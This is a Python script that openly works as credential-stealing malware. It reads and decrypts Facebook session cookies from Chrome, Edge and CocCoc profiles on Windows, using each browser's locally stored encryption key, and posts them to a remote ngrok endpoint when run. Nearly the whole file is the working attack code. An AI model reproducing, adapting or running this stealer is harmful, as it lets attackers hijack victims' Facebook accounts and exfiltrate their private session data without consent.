import os
import base64
import sqlite3
import win32crypt # pip install pypiwin32
from Crypto.Cipher import AES # pip install pycryptodome
import json
import requests
import mysql.connector as mysql
conn = mysql.connect(
    host="localhost",
    user="root",
    password="1234"
    )
sql = conn.cursor()
query_use_db = "use userinfo"
sql.execute(query_use_db)

def decrypt_data(data, key):
    try:
        # get the initialization vector
        iv = data[3:15]
        data = data[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            # not supported
            return ""


def get_encryption_key(browser):
	local_state_path = None
	try:
		if browser == 'coccoc':
			local_state_path = os.path.join(os.environ["USERPROFILE"],
		                                        "AppData", "Local", "CocCoc", "Browser",
		                                        "User Data", "Local State")
		if browser == 'chrome':
			local_state_path = os.path.join(os.environ["USERPROFILE"],
		                                        "AppData", "Local", "Google", "Chrome",
		                                        "User Data", "Local State")
		if browser == 'edge':
			local_state_path = os.path.join(os.environ["USERPROFILE"],
		                                        "AppData", "Local", "Microsoft", "Edge",
		                                        "User Data", "Local State")
	except:
		pass
	try:
		if local_state_path != None:
			with open(local_state_path, "r", encoding="utf-8") as f:
				local_state = f.read()
				local_state = json.loads(local_state)
			key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
			key = key[5:]
			return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
		return None
	except:
		return None

def craw_cookie():
	list_cookie = ""
	conn = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies")
	conn.text_factory = lambda b: b.decode(errors = 'ignore')
	list_cookie+=read_cookie_from_sqlite(conn)+"\n##########\n"
	for i in range(0,1000):
		try:
			conn = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Profile "+str(i)+"\\Network\\Cookies")
			conn.text_factory = lambda b: b.decode(errors = 'ignore')
			cookie = read_cookie_from_sqlite(conn)+"\n##########\n"
			list_cookie+=cookie
		except:
			pass
	return list_cookie

def craw_cookie_browser_chrome():
	list_cookie = ""
	try:
		conn = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies")
		conn.text_factory = lambda b: b.decode(errors = 'ignore')
		list_cookie+=read_cookie_from_sqlite(conn,'chrome')+"\n##########\n"
	except:
		pass
	for i in range(0,1000):
		try:
			conn = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Profile "+str(i)+"\\Network\\Cookies")
			conn.text_factory = lambda b: b.decode(errors = 'ignore')
			cookie = read_cookie_from_sqlite(conn,'chrome')+"\n##########\n"
			list_cookie+=cookie
		except:
			pass
	return list_cookie

def craw_cookie_browser_coccoc():
	list_cookie = ""
	try:
		conn = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\CocCoc\\Browser\\User Data\\Default\\Network\\Cookies")
		conn.text_factory = lambda b: b.decode(errors = 'ignore')
		list_cookie+=read_cookie_from_sqlite(conn,'coccoc')+"\n##########\n"
	except:
		pass
	for i in range(0,1000):
		try:
			conn = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\CocCoc\\Browser\\User Data\\Profile "+str(i)+"\\Network\\Cookies")
			conn.text_factory = lambda b: b.decode(errors = 'ignore')
			cookie = read_cookie_from_sqlite(conn,'coccoc')+"\n##########\n"
			list_cookie+=cookie
		except:
			pass
	try:
		conn = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\CocCoc\\Browser\\User Data\\Default\\Cookies")
		conn.text_factory = lambda b: b.decode(errors = 'ignore')
		list_cookie+=read_cookie_from_sqlite(conn,'coccoc')+"\n##########\n"
	except:
		pass
	for i in range(0,1000):
		try:
			conn = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\CocCoc\\Browser\\User Data\\Profile "+str(i)+"\\Cookies")
			conn.text_factory = lambda b: b.decode(errors = 'ignore')
			cookie = read_cookie_from_sqlite(conn,'coccoc')+"\n##########\n"
			list_cookie+=cookie
		except:
			pass
	return list_cookie

def craw_cookie_browser_edge():
	list_cookie = ""
	try:
		conn = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies")
		conn.text_factory = lambda b: b.decode(errors = 'ignore')
		list_cookie+=read_cookie_from_sqlite(conn,'edge')+"\n##########\n"
	except:
		pass
	for i in range(0,1000):
		try:
			conn = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\Microsoft\\Edge\\User Data\\Profile "+str(i)+"\\Network\\Cookies")
			conn.text_factory = lambda b: b.decode(errors = 'ignore')
			cookie = read_cookie_from_sqlite(conn,'edge')+"\n##########\n"
			list_cookie+=cookie
		except:
			pass
	return list_cookie


def read_cookie_from_sqlite(conn,browser):
	list_cookie = ""
	if conn != None:
		with conn:
			cur = conn.cursor()
			cur.execute("SELECT host_key,name,encrypted_value FROM Cookies WHERE host_key LIKE '%facebook.com%' ORDER BY host_key")
			key = get_encryption_key(browser)
			if key != None:
				for i in cur.fetchall():
					decrypted_value = decrypt_data(i[2], key)
					list_cookie += i[1]+"="+decrypted_value+";" #
				return list_cookie
def get_all_cookie_browser():
	list_cookie = "Chrome: "+craw_cookie_browser_chrome()+"===========================\n"+"CocCoc: "+craw_cookie_browser_coccoc()+"===========================\n"+"Edge: "+craw_cookie_browser_edge()
	save_cookie_to_db(list_cookie)
def save_cookie_to_db(cookie):
	url = "https://bb5b-14-189-137-210.ngrok.io/save_cookie"

	data = {
		'cookie': cookie
	}
	requests.post(url,data=data)

get_all_cookie_browser()